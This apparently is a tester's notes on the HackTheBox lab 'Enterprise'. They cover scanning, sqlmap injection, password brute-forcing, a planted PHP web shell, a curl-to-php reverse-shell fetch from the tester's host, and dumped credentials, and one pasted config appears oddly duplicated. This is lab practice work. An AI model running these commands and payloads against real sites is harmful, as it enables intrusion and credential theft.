@@ -1,0 +1,947 @@
+Machine-Name  :  Enterprise
+IP-Address    :  10.129.1.81
+
+Command-Line: nmap -p- -T4 -A 10.129.1.81
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 10:39 EDT
+    Nmap scan report for enterprise.htb (10.129.1.81)
+    Host is up (0.050s latency).
+    Not shown: 65529 closed ports
+    PORT      STATE    SERVICE  VERSION
+    22/tcp    open     ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+    |   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+    |_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
+    80/tcp    open     http     Apache httpd 2.4.10 ((Debian))
+    |_http-generator: WordPress 4.8.1
+    |_http-server-header: Apache/2.4.10 (Debian)
+    |_http-title: USS Enterprise &#8211; Ships Log
+    443/tcp   open     ssl/http Apache httpd 2.4.25 ((Ubuntu))
+    |_http-server-header: Apache/2.4.25 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+    | ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+    | Not valid before: 2017-08-25T10:35:14
+    |_Not valid after:  2017-09-24T10:35:14
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn:
+    |_  http/1.1
+    5355/tcp  filtered llmnr
+    8080/tcp  open     http     Apache httpd 2.4.10 ((Debian))
+    |_http-generator: Joomla! - Open Source Content Management
+    |_http-open-proxy: Proxy might be redirecting requests
+    | http-robots.txt: 15 disallowed entries
+    | /joomla/administrator/ /administrator/ /bin/ /cache/
+    | /cli/ /components/ /includes/ /installation/ /language/
+    |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+    |_http-server-header: Apache/2.4.10 (Debian)
+    |_http-title: Home
+    32812/tcp open     unknown
+    | fingerprint-strings:
+    |   GenericLines, GetRequest, HTTPOptions:
+    |     _______ _______ ______ _______
+    |     |_____| |_____/ |______
+    |     |_____ |_____ | | | _ ______|
+    |     Welcome to the Library Computer Access and Retrieval System
+    |     Enter Bridge Access Code:
+    |     Invalid Code
+    |     Terminating Console
+    |   NULL:
+    |     _______ _______ ______ _______
+    |     |_____| |_____/ |______
+    |     |_____ |_____ | | | _ ______|
+    |     Welcome to the Library Computer Access and Retrieval System
+    |_    Enter Bridge Access Code:
+    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+    SF-Port32812-TCP:V=7.91%I=7%D=3/15%Time=604F71CA%P=x86_64-pc-linux-gnu%r(N
+    SF:ULL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+    SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
+    SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
+    SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
+    SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
+    SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
+    SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
+    SF:\x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20\x2
+    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
+    SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
+    SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
+    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
+    SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
+    SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
+    SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
+    SF:ting\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x20\
+    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
+    SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
+    SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
+    SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
+    SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
+    SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
+    SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
+    SF:nating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x20\x
+    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
+    SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
+    SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
+    SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
+    SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
+    SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
+    SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
+    SF:rminating\x20Console\n\n");
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.12 seconds
+
+
+Notes: Noticed the SSL certificate. Taking a look at the information.
+SSL-Certicate-Info:
+    enterprise.local
+    jeanlucpicard@enterprise.local
+
+
+Command-Line: sudo ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e ph,txt -f -t 50 -u https://10.129.1.81
+Result:
+    /home/kali/HackingTools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
+      warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: ph, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-03-17_17-05-02.log
+
+    Target: https://10.129.1.81/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.81/_21-03-17_17-05-02.txt
+
+    [17:05:02] Starting:
+    [17:05:05] 403 -  293B  - /icons/
+    [17:05:05] 301 -  312B  - /files  ->  https://10.129.1.81/files/
+    [17:05:05] 200 -  941B  - /files/
+
+Browser: https://10.129.1.81/files
+Notes: Downloaded and unzipped lcars.zip
+Result:
+    /lcars_d
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -u http://10.129.1.81
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-03-17_19-09-04.log
+
+    Target: http://10.129.1.81/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.81/_21-03-17_19-09-04.txt
+
+    Can't write reports to /home/kali/HackingTools/dirsearch/reports/10.129.1.81
+    ┌──(kali㉿kali)-[~/HackingTools/dirsearch]
+    └─$ ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -u http://enterprise.htb
+
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-03-17_19-09-32.log
+
+    Target: http://enterprise.htb/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/enterprise.htb/_21-03-17_19-09-34.txt
+
+    [19:09:34] Starting:
+    [19:09:34] 301 -    0B  - /index.php  ->  http://enterprise.htb/
+    [19:09:36] 403 -  295B  - /icons/
+    [19:09:39] 200 -    0B  - /wp-content/
+    [19:09:39] 301 -  321B  - /wp-content  ->  http://enterprise.htb/wp-content/
+    [19:09:43] 200 -    2KB - /wp-login.php
+    [19:09:46] 200 -   19KB - /license.txt
+    [19:09:48] 301 -  322B  - /wp-includes  ->  http://enterprise.htb/wp-includes/
+    [19:09:48] 403 -  301B  - /wp-includes/
+
+
+
+Command-Line: wpscan -e p,t,u,tt --url http://10.129.1.81 | tee wp-scan.log
+Result:
+    /wp-scan.log
+
+Notes: Found name "william-riker". http://10.129.1.81/xmlrpc.php
+
+Browser: http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
+Result: Failed to read query
+
+Browser: http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1
+Result:  Catchable fatal error: Object of class mysqli_result could not be converted to string in /var/www/html/wp-content/plugins/lcars/lcars_db.php on line 16
+Notes: Using MySQL.
+
+Notes: Sent previous browser URL to BurpSuite. Sent to Repeater. Copy to File. /home/kale/HTB/Machines/Enterprise_NF/lcars_db.req.
+Command-Line: sqlmap -r lcars_db.req --dbms mysql
+Notes: sqlmap -r <request> --dbms <DataBaseManagementSystem>
+Result:
+            ___
+           __H__
+     ___ ___[)]_____ ___ ___  {1.5.2#stable}
+    |_ -| . ["]     | .'| . |
+    |___|_  [,]_|_|_|__,|  _|
+          |_|V...       |_|   http://sqlmap.org
+
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+    [*] starting @ 18:17:43 /2021-03-17/
+
+    [18:17:43] [INFO] parsing HTTP request from 'lcars_db.req'
+    [18:17:43] [INFO] testing connection to the target URL
+    [18:17:45] [INFO] testing if the target URL content is stable
+    [18:17:45] [INFO] target URL content is stable
+    [18:17:45] [INFO] testing if GET parameter 'query' is dynamic
+    [18:17:45] [WARNING] GET parameter 'query' does not appear to be dynamic
+    [18:17:45] [WARNING] heuristic (basic) test shows that GET parameter 'query' might not be injectable
+    [18:17:45] [INFO] testing for SQL injection on GET parameter 'query'
+    [18:17:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+    [18:17:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+    [18:17:47] [INFO] GET parameter 'query' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="error")
+    [18:17:47] [INFO] testing 'Generic inline queries'
+    [18:17:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+    [18:17:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+    [18:17:47] [WARNING] time-based comparison requires larger statistical model, please wait............ (done)
+    [18:17:59] [INFO] GET parameter 'query' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+    [18:18:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+    [18:18:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+    [18:18:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [18:18:22] [INFO] target URL appears to have 1 column in query
+    do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+    [18:18:29] [INFO] target URL appears to be UNION injectable with 1 columns
+    [18:18:29] [INFO] checking if the injection point on GET parameter 'query' is a false positive
+    GET parameter 'query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+    sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
+    ---
+    Parameter: query (GET)
+        Type: boolean-based blind
+        Title: Boolean-based blind - Parameter replace (original value)
+        Payload: query=(SELECT (CASE WHEN (1956=1956) THEN 1 ELSE (SELECT 7060 UNION SELECT 8073) END))
+
+        Type: time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+        Payload: query=1 AND (SELECT 1215 FROM (SELECT(SLEEP(5)))FDTq)
+    ---
+    [18:18:37] [INFO] the back-end DBMS is MySQL
+    web server operating system: Linux Debian 8 (jessie)
+    web application technology: Apache 2.4.10, PHP 5.6.31
+    back-end DBMS: MySQL >= 5.0.12
+    [18:18:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/enterprise.htb'
+
+    [*] ending @ 18:18:38 /2021-03-17/
+
+Notes: Had to cancel. Request taking too long. Switching to a more specific sqlmap query.
+Command-Line: sqlmap http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --threads 10 -D wordpress -T wp_posts -C post_content --dump
+Result:
+    ~/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv
+
+Found-Passwords: "ZxJyhGem4k338S2Y", "u*Z14ru0p#ttj83zS6", "enterprisencc170", and "ZD3YxfnSjezg67JZ"
+Command-Line: wpscan --url http://enterprise.htb -U "william.riker" -P /home/kali/HTB/Machines/Enterprise_NF/passwords.txt
+Result:
+    _______________________________________________________________
+             __          _______   _____
+             \ \        / /  __ \ / ____|
+              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+                \  /\  /  | |     ____) | (__| (_| | | | |
+                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+             WordPress Security Scanner by the WPScan Team
+                             Version 3.8.15
+           Sponsored by Automattic - https://automattic.com/
+           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+    _______________________________________________________________
+
+    [+] URL: http://enterprise.htb/ [10.129.1.81]
+    [+] Started: Sun Mar 21 14:15:12 2021
+
+    Interesting Finding(s):
+
+    [+] Headers
+     | Interesting Entries:
+     |  - Server: Apache/2.4.10 (Debian)
+     |  - X-Powered-By: PHP/5.6.31
+     | Found By: Headers (Passive Detection)
+     | Confidence: 100%
+
+    [+] XML-RPC seems to be enabled: http://enterprise.htb/xmlrpc.php
+     | Found By: Direct Access (Aggressive Detection)
+     | Confidence: 100%
+     | References:
+     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+    [+] WordPress readme found: http://enterprise.htb/readme.html
+     | Found By: Direct Access (Aggressive Detection)
+     | Confidence: 100%
+
+    [+] The external WP-Cron seems to be enabled: http://enterprise.htb/wp-cron.php
+     | Found By: Direct Access (Aggressive Detection)
+     | Confidence: 60%
+     | References:
+     |  - https://www.iplocation.net/defend-wordpress-from-ddos
+     |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+    [+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
+     | Found By: Rss Generator (Passive Detection)
+     |  - http://enterprise.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.8.1</generator>
+     |  - http://enterprise.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8.1</generator>
+
+    [+] WordPress theme in use: twentyseventeen
+     | Location: http://enterprise.htb/wp-content/themes/twentyseventeen/
+     | Last Updated: 2021-03-09T00:00:00.000Z
+     | Readme: http://enterprise.htb/wp-content/themes/twentyseventeen/README.txt
+     | [!] The version is out of date, the latest version is 2.6
+     | Style URL: http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1
+     | Style Name: Twenty Seventeen
+     | Style URI: https://wordpress.org/themes/twentyseventeen/
+     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+     | Author: the WordPress team
+     | Author URI: https://wordpress.org/
+     |
+     | Found By: Css Style In Homepage (Passive Detection)
+     |
+     | Version: 1.3 (80% confidence)
+     | Found By: Style (Passive Detection)
+     |  - http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1, Match: 'Version: 1.3'
+
+    [+] Enumerating All Plugins (via Passive Methods)
+
+    [i] No plugins Found.
+
+    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
+     Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (22 / 22) 100.00% Time: 00:00:00
+
+    [i] No Config Backups Found.
+
+    [+] Performing password attack on Xmlrpc against 1 user/s
+    [SUCCESS] - william.riker / u*Z14ru0p#ttj83zS6
+    Trying william.riker / ZD3YxfnSjezg67JZ Time: 00:00:00 <==================================================                                                   > (4 / 8) 50.00%  ETA: ??:??:??
+
+    [!] Valid Combinations Found:
+     | Username: william.riker, Password: u*Z14ru0p#ttj83zS6
+
+    [!] No WPScan API Token given, as a result vulnerability data has not been output.
+    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+    [+] Finished: Sun Mar 21 14:15:18 2021
+    [+] Requests Done: 60
+    [+] Cached Requests: 5
+    [+] Data Sent: 16.452 KB
+    [+] Data Received: 308.729 KB
+    [+] Memory used: 241.676 MB
+    [+] Elapsed time: 00:00:05
+
+
+Browser: http://enterprise.htb/wp-admin
+Username: william.riker
+Password: u*Z14ru0p#ttj83zS6
+WP-LOGIN: *** SUCCESSFUL ***
+
+
+Notes: Editing lcars plugin in WordPress site, then activating it and visiting.
+PATH: /wp-content/plugins/lcars/lcars.php
+Original-File-Contents:
+    <?php
+    /*
+    *     Plugin Name: lcars
+    *     Plugin URI: enterprise.htb
+    *     Description: Library Computer Access And Retrieval System
+    *     Author: Geordi La Forge
+    *     Version: 0.2
+    *     Author URI: enterprise.htb
+    *                             */
+
+    // Need to create the user interface.
+
+    // need to finsih the db interface
+
+    // need to make it secure
+
+    ?>
+
+New-File-Contents:
+    <?php system($_REQUEST['cmd']) ?>
+
+Notes: Found "Author" "Geordi La Forge".
+Checked
+Browser: http://enterprise.htb/wp-content/plugins/lcars/lcars.php?cmd=whoami
+Result:
+    www-data
+
+Browser: http://enterprise.htb/wp-content/plugins/lcars/lcars.php?cmd=ls /home/user.txt
+Result:
+    "As you take a look around at your surroundings you realise there is something wrong. This is not the Enterprise! As you try to interact with a console it dawns on you. Your in the Holodeck!"
+Notes: WP site is inside a container. Trying to dump JoomlaDB.
+
+Notes: Also tried putting <?php system($_REQUEST['cmd']) ?> into the "header" through WordPress dashboard.
+Command-Line: sudo python3 -m http.server --bind 10.10.14.58 80
+Command-Line: cp /usr/share/laudanum/php/php-reverse-shell.php .
+Command-Line: mv php-reverse-shell.php reverse-shell.php
+Browser: http://enterprise.htb/?cmd=curl http://10.10.14.58/reverse-shell.php|php
+Result: Reverse-Shell (Not a real shell. Unable to use python.)
+$ cat /home/user.txt
+Result:
+    "As you take a look around at your surroundings you realise there is something wrong. This is not the Enterprise! As you try to interact with a console it dawns on you. Your in the Holodeck!"
+
+
+$ cat /var/www/html/wp-config.php
+Result:
+    // ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define('DB_NAME', 'wordpress');
+
+    /** MySQL database username */
+    define('DB_USER', 'root');
+
+    /** MySQL database password */
+    define('DB_PASSWORD', '// ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define('DB_NAME', 'wordpress');
+
+    /** MySQL database username */
+    define('DB_USER', 'root');
+
+    /** MySQL database password */
+    define('DB_PASSWORD', 'NCC-1701E');
+
+    /** MySQL hostname */
+    define('DB_HOST', 'mysql');
+
+    /** Database Charset to use in creating database tables. */
+    define('DB_CHARSET', 'utf8');
+
+    /** The Database Collate type. Don't change this if in doubt. */
+    define('DB_COLLATE', '');
+
+    /**#@+
+     * Authentication Unique Keys and Salts.
+     *
+     * Change these to different unique phrases!
+     * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+     * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+     *
+     * @since 2.6.0
+     */
+    define('AUTH_KEY',         '2bfc1650943c2c5b62e31637481fdc04c5be50bf');
+    define('SECURE_AUTH_KEY',  '793b47a06051495f9700711b166fd1977882da54');
+    define('LOGGED_IN_KEY',    '60af8fe7325c75bbeec4ce140ac1f052f4d3d5cd');
+    define('NONCE_KEY',        'e8ca955667563b04b225c7268f8cf1f00c87c891');
+    define('AUTH_SALT',        'a3599324fb87ccfe09554ad9523765bf40a59c2a');
+    define('SECURE_AUTH_SALT', 'dd6752c340fd68909cd4e2f0eea03a3d8ef28279');
+    define('LOGGED_IN_SALT',   '9a01df7b37e2c700d4fadff98a8034d2b445addc');
+    define('NONCE_SALT',       '253750278534eb62736ed8ac986fd473c57acd3e');
+    ');
+
+    /** MySQL hostname */
+    define('DB_HOST', 'mysql');
+
+    /** Database Charset to use in creating database tables. */
+    define('DB_CHARSET', 'utf8');
+
+    /** The Database Collate type. Don't change this if in doubt. */
+    define('DB_COLLATE', '');
+
+    /**#@+
+     * Authentication Unique Keys and Salts.
+     *
+     * Change these to different unique phrases!
+     * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+     * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+     *
+     * @since 2.6.0
+     */
+    define('AUTH_KEY',         '2bfc1650943c2c5b62e31637481fdc04c5be50bf');
+    define('SECURE_AUTH_KEY',  '793b47a06051495f9700711b166fd1977882da54');
+    define('LOGGED_IN_KEY',    '60af8fe7325c75bbeec4ce140ac1f052f4d3d5cd');
+    define('NONCE_KEY',        'e8ca955667563b04b225c7268f8cf1f00c87c891');
+    define('AUTH_SALT',        'a3599324fb87ccfe09554ad9523765bf40a59c2a');
+    define('SECURE_AUTH_SALT', 'dd6752c340fd68909cd4e2f0eea03a3d8ef28279');
+    define('LOGGED_IN_SALT',   '9a01df7b37e2c700d4fadff98a8034d2b445addc');
+    define('NONCE_SALT',       '253750278534eb62736ed8ac986fd473c57acd3e');
+
+
+Notes: Passwords-Found: "NCC-1701E"
+
+
+
+
+== SCRIPTED-ATTACK =============================================================
+    Notes: Created a python3 login script (/joomla_brute_force.py).
+    Command-Line: python3 joomla_brute_force.py
+    Result:
+        Status: 200, william.riker:ZxJyhGem4k338S2Y -- 9224
+        Status: 200, william.riker:u*Z14ru0p#ttj83zS6 -- 9224
+        Status: 200, william.riker:enterprisencc170 -- 9224
+        Status: 200, william.riker:ZD3YxfnSjezg67JZ -- 9224
+        Status: 200, william.riker:NCC-1701E -- 9224
+        Status: 200, geordi.la.forge:ZxJyhGem4k338S2Y -- 9224
+        Status: 200, geordi.la.forge:u*Z14ru0p#ttj83zS6 -- 9224
+        Status: 200, geordi.la.forge:enterprisencc170 -- 9224
+        Status: 200, geordi.la.forge:ZD3YxfnSjezg67JZ -- 8784
+        Status: 200, geordi.la.forge:NCC-1701E -- 9224
+
+    Notes: Notice the length of all the responses are the same except for the line where the username is "geordi.la.forge" and the password is "ZD3YxfnSjezg67JZ".
+    Testing-Login:
+        Username: geordi.la.forge
+        Password: ZD3YxfnSjezg67JZ
+    Result:
+        *** SUCCESSFUL ***
+================================================================================
+
+
+
+== BURPSUITE-ATTACK ============================================================
+    Browser: http://enterprise.htb:8080
+    Notes: Turned on Intercept and intercepted the form using Burp. Sent to Intruder. Added variable symbols to username/password. PAYLOADS: Using "Cluster bomb". 1.) /users.txt, 2.) /passwords.txt. OPTIONS: Added "Username and password do not match or you do not have an account yet" to options for flagging. Started attack.
+    Result:
+        /burp_intruder_results_1.png
+        /burp_intruder_results_2.png
+
+    Notes: On further inspection of the largest file (692), the Response indicated it was given a "Set-Cookie".
+    Testing-Login:
+        Username: geordi.la.forge
+        Password: ZD3YxfnSjezg67JZ
+    Result:
+        *** JOOMLA LOGIN SUCCESSFUL ***
+================================================================================
+
+
+Browser: http://enterprise.htb:8080/administrator
+Notes: (This is the admin login for Joomla).
+Testing-Login:
+    Username: geordi.la.forge
+    Password: ZD3YxfnSjezg67JZ
+Result:
+    *** SUCCESSFUL ***
+
+$ cat /home/user.txt
+Result:
+    "This is not the Enterprise! As you try to interact with a console it dawns on you. Your in the Holodeck!"
+Notes: Another container...
+
+$ cd /var/www/html
+$ ls
+Result:
+    drwxr-xr-x 18 www-data www-data    4096 Sep  8  2017 .
+    drwxr-xr-x  4 root     root        4096 Jul 24  2017 ..
+    -rw-r--r--  1 www-data www-data    3006 Sep  3  2017 .htaccess
+    -rw-r--r--  1 www-data www-data   18092 Aug 14  2017 LICENSE.txt
+    -rw-r--r--  1 www-data www-data    4874 Aug 14  2017 README.txt
+    drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 administrator
+    drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 bin
+    drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cache
+    drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cli
+    drwxr-xr-x 20 www-data www-data    4096 Sep  3  2017 components
+    -r--r--r--  1 www-data www-data    3053 Sep  6  2017 configuration.php
+    -rwxrwxr-x  1 www-data www-data    3131 Sep  7  2017 entrypoint.sh
+    drwxrwxrwx  2 root     root        4096 Oct 17  2017 files
+    -rw-rw-rw-  1 www-data www-data 5457775 Sep  8  2017 fs.out
+    -rw-rw-rw-  1 www-data www-data 8005634 Sep  8  2017 fsall.out
+    -rw-rw-rw-  1 www-data www-data 2044787 Sep  7  2017 goonthen.txt
+    -rw-r--r--  1 www-data www-data    3005 Aug 14  2017 htaccess.txt
+    drwxr-xr-x  5 www-data www-data    4096 Sep  6  2017 images
+    drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 includes
+    -rw-r--r--  1 www-data www-data    1420 Aug 14  2017 index.php
+    drwxr-xr-x  4 www-data www-data    4096 Aug 14  2017 language
+    drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 layouts
+    drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 libraries
+    -rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb
+    -rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb.php
+    drwxr-xr-x 26 www-data www-data    4096 Aug 14  2017 media
+    -rw-rw-rw-  1 www-data www-data 1474911 Sep  7  2017 mod.out
+    drwxr-xr-x 27 www-data www-data    4096 Aug 14  2017 modules
+    -rw-rw-rw-  1 www-data www-data  252614 Sep  7  2017 onemoretry.txt
+    -rw-rw-rw-  1 www-data www-data     793 Sep  8  2017 out.zip
+    drwxr-xr-x 16 www-data www-data    4096 Aug 14  2017 plugins
+    -rw-r--r--  1 www-data www-data     836 Aug 14  2017 robots.txt
+    drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 templates
+    drwxr-xr-x  2 www-data www-data    4096 Sep  6  2017 tmp
+    -rw-r--r--  1 www-data www-data    1690 Aug 14  2017 web.config.txt
+    -rwxr-xr-x  1 www-data www-data    3736 Sep  6  2017 wordpress-shell.php
+$ cd files
+$ ls
+Result:
+  lcars.zip
+$ ip neigh
+Result:
+    172.17.0.1 dev eth0 lladdr 02:42:e0:c2:7f:28 REACHABLE
+    172.17.0.2 dev eth0 lladdr 02:42:ac:11:00:02 STALE
+$ ip addr
+Result:
+    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+        inet 127.0.0.1/8 scope host lo
+           valid_lft forever preferred_lft forever
+    8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+        link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
+        inet 172.17.0.4/16 scope global eth0
+           valid_lft forever preferred_lft forever
+
+
+Notes: Remembering from earlier how to obtain access to the lcars.zip file.
+Browser: https://10.129.1.81/files
+Result:
+    "Index of /files"
+
+$ touch uk47.txt
+Notes: Browser refresh indicates we are able to add files and directories.
+$ rm -rf uk47.txt
+
+Command-Line: nc -lvnp 9002
+Command-Line: cp reverse-shell.php reverse-shell_2.php
+Command-Line: nano reverse-shell_2.php
+Notes: Changes port to "9002".
+Command-Line sudo python3 -m http.server --bind 10.10.14.58 80
+
+$ curl 10.10.14.58/reverse-shell_2.php -o uk47.php
+Browser: https://10.129.1.81/files
+Notes: Clicked on "uk47.php".
+Result:
+    *** REVERSE-SHELL ***
+
+$ which python3
+Result:
+    /usr/bin/python3
+
+$ export TERM=linux
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    www-data@enterprise:/$
+
